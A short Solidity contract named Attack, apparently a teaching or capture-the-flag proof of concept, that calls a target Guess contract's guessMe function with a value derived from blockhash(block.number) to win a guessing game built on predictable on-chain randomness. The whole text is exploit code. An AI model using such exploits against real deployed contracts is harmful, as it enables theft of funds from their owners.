contract Attack {
    Guess g;
    event LogSuccess(address sender, bool success);
    constructor(address guessIt) public {
        g = Guess(guessIt);
    }
    function notSoHardAfterAll() public {
        if(g.guessMe(uint(blockhash(block.number)))) {
            emit LogSuccess(msg.sender, true);
        }
    }
}
